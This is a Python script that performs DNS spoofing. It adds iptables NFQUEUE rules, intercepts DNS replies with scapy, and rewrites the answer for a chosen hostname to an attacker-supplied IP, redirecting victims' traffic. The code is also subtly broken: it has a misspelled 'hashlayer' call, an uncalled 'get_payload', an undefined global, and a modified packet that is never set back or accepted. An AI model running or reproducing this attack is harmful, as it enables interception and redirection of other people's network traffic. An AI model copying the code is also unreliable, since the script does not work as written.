import netfilterqueue
import scapy.all as scapy
import subprocess


if_hostname: str
to_ip: str
VMenv: str


def process_packet(packet):
    global from_hostname
    global to_ip

    scapy_packet = scapy.IP(packet.get_payload)

    if scapy_packet.hashlayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if if_hostname in qname:
            print("[+] Spoofing start")
            answer = scapy.DNSRR(rrname=qname, rdata=to_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum


def env_set(VMenv):

    if VMenv == "VM":
        subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
        subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    elif VMenv == "OS":
        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    else:
        print("[!] Wrong enviroment settings")


if __name__ == "__main__":

    if_hostname = "geekboards.ru"
    to_ip = "140.82.121.3"
    VMenv = "VM"

    env_set(VMenv)

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
